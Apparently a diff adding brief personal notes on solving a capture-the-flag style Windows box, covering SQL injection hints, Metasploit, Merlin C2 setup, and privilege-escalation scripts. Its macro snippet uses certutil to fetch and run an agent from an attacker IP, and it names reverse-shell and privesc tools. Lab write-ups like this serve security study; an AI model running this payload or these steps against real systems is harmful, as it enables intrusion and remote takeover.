@@ -1,0 +1,24 @@
+(love this box, learnt merlin, TODO: the client side attack doesn't work)
+Hints:
+- sqli and some sql doesn't have quote.
+- msf, search owa
+- security => don't try powershell reverse shell first, try merlin first
+- using echo to create file is bad because the reversed shell may have some encoding issue
+
+Details:
+- (joomla)/administrator/manifests/ => /files/joomla.xml => get version; (not useful here)
+- tools => macro. select mypst.odt => tools => select macro => select mypst.odt => new
+- use certutil.exe to download
+- code:
+    Sub OnLoad
+        shell("cmd /c certutil -urlcache -split -f http://10.10.14.19/merlinagent.exe c:\Temp\agent.exe && c:\temp\agent.exe")
+    End Subt
+- when build go, do it: `GOOS=windows GOARCH=amd64 go build` to build merlin agent
+- `go build` to build merlin and move it to /opt/merlin/
+- go to opt/merlin/data/x509 and rm the old cert and create new cert
+    - openssl req -x509 -newkey rsa:4096 -sha256 -nodes -keyout server.key -out server.crt -subj "/CN=zhe0ops.com" -days 7
+- then we can run `(/opt/merlin/)./merlinserver -i <your ip>`
+- /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 (edit needed)
+- /opt/PowerSploit/Privesc/PowerUp.ps1 (edit needed)
+- /opt/JAWS/jaws-enum.ps1
+- schtasks /RUN /TN "<task name, no />"
